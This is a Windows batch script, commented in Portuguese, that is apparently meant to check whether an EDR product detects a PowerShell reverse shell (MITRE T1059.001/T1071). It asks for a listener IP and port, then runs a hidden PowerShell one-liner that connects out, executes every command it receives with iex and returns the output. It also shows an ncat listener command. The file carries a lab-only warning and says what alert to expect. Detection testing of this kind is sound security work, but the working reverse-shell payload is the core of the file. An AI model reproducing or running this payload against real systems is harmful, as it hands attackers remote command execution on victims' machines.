@echo off
chcp 65001 >nul
title [06] Shell Reversa - Validacao EDR
color 0C
cls
echo ============================================================
echo   [06] SHELL REVERSA (Command ^& Control)
echo   MITRE ATT&CK: T1059.001 / T1071  ^|  Sev.: CRITICA
echo ============================================================
echo.
echo   A maquina de LAB vai 'ligar' para o SEU servidor ouvinte.
echo   Antes, no servidor, deixe um listener ativo, ex.:
echo       ncat -lvnp 80
echo.
echo   Use SOMENTE entre maquinas do SEU laboratorio.
echo ============================================================
echo.
set /p RIP="Digite o IP do seu servidor ouvinte: "
set /p RPORT="Digite a porta (ENTER = 80): "
if "%RPORT%"=="" set RPORT=80

if "%RIP%"=="" (
  echo [ERRO] IP nao informado. Abortando.
  pause
  exit /b 1
)

echo.
echo [*] Abrindo conexao reversa para %RIP%:%RPORT% via PowerShell...
echo     (feche esta janela para encerrar a shell)
echo.

powershell -NoP -W Hidden -C "$c=New-Object System.Net.Sockets.TCPClient('%RIP%',%RPORT%);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"

echo.
echo ------------------------------------------------------------
echo   Conexao encerrada.
echo   Verifique o ALERTA no console do seu EDR.
echo   Esperado: C2 / conexao de rede anomala do PowerShell (CRITICO).
echo ------------------------------------------------------------
echo.
pause
